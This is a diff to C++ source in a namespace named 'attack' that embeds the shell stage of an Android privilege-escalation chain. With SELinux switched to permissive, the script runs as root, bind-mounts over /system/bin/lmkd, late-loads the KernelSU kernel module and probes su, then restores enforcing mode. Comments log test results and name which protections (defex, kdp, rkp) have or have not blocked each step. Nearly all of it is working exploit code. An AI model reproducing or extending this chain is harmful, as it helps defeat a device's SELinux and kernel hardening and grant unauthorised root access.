-            "  sleep 2\n"
             "else\n"
-            "  echo \"[!] KernelSU module not ready seen=$KSU_SEEN boot=$KSU_BOOT install=$KSU_INSTALL\" >>\"$LOG\"\n"
+            "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
             "fi\n"
-            /* The bind mount was detached inside run_late_load; the EXIT trap
-             * is the backstop if this shell is killed mid-attempt. */
-            /* Measured 2026-11-15: the module loads and the manager is crowned,
-             * but KernelSU's userspace half never lands (install=0) -- the ksud
-             * daemon dies after init_module while this shell, already uid 0,
-             * keeps running. Record what install left behind, then try the one
-             * thing the guard has not been observed to stop: su from a shell
-             * that is already root. A kill here costs a reboot 15 s later, so
-             * both the dump and the verdict are written before the attempt. */
-            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
-            "  echo 'ADB-DUMP-BEGIN'\n"
-            "  ls -la /data/adb 2>&1 | head -n 15\n"
-            "  ls -la /data/adb/ksu/bin 2>&1 | head -n 10\n"
-            "  echo 'ADB-DUMP-END'\n"
-            "  if [ \"$KSU_READY\" -eq 1 ] && [ -x \"$KSUD\" ]; then\n"
-            "    echo 'SU-PROBE-BEGIN'\n"
-            "    su_out=$(echo id | \"$KSUD\" debug su 2>&1); su_rc=$?\n"
-            "    echo \"$su_out\" | head -n 5\n"
-            "    echo \"SU-PROBE-RC=$su_rc\"\n"
-            "    echo 'SU-PROBE-END'\n"
-            "  fi\n"
-            "fi\n"
-            "umount -l /system/bin/lmkd 2>/dev/null\n"
-            /* The throne tracker crowns the manager during kernelsu_init. When
-             * the APK signature does not match the module's hardened hash the
-             * manager is never crowned and no app can be granted root even
-             * though the LKM is live -- the exact "LKM works, no root" state.
-             * dmesg is unreadable once enforcing, so read the drained copy. */
-            "KSU_MANAGER=no-evidence\n"
-            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
-            "  ksu_crown\n"
-            "  echo \"KSU-MANAGER $KSU_MANAGER\"\n"
-            "fi\n"
+            /* Dump while still permissive: after the enforcing restore the
+             * toolbox domain cannot write the app's data dir, which is why the
+             * previous build's dump silently vanished. The late-load path also
+             * dumps before the load; a module-init re-enforce can make this
+             * second dump fail, but the earlier files remain. */
             "dump_debug\n"
             "DUMP_DONE=1\n"
             "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
@@ -1011,15 +693,11 @@ namespace ghostlock::attack {
              * the enforcing restore, and every dmesg read is bounded, so a
              * stuck dmesg can never hold the cleanup. */
             "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
-            "  echo \"KSU-SUMMARY seen=$KSU_SEEN boot=$KSU_BOOT install=$KSU_INSTALL manager=$KSU_MANAGER attempts=$KSU_ATTEMPT enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) mirror=$KMSG_MIRROR log=$LOG\"\n"
-            /* The drained kernel log is the only KSU evidence that survives the
-             * enforcing flip; print it so the run log alone tells the story. */
-            "  echo 'KSU-DMESG-BEGIN'\n"
-            "  command grep -i -E 'KernelSU|kernelsu|crowning manager|is_manager|search manager' \"$KMSG_MIRROR\" 2>/dev/null | tail -n 30\n"
-            "  echo 'KSU-DMESG-END'\n"
+            "  echo \"KSU-SUMMARY enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) kernelsu=$(grep -c '^kernelsu' /proc/modules 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) log=$LOG\"\n"
+            "  timeout 2 dmesg 2>/dev/null | command grep -i -E 'defex|kdp|rkp|kernelsu' | tail -n 15\n"
             "fi\n"
             "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-            "  restore_enforce ksu-not-ready\n"
+            "  restore_enforce ksu-not-loaded\n"
             "  exit 1\n"
             "fi\n"
             "else\n"
